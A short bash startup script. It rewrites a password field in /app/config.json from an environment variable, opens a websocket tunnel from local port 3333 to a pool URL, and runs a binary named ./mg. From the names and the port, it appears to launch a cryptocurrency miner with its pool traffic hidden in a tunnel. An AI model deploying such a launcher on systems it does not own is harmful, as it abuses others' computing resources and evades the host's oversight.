#!/bin/bash

sed -i "s/\"pass\": \"notunn\"/\"pass\": \"$NAME_ID\"/" /app/config.json

/my-tu -L 127.0.0.1:3333:${POOL_URL} ${WS_URL} &
cd /app
./mg
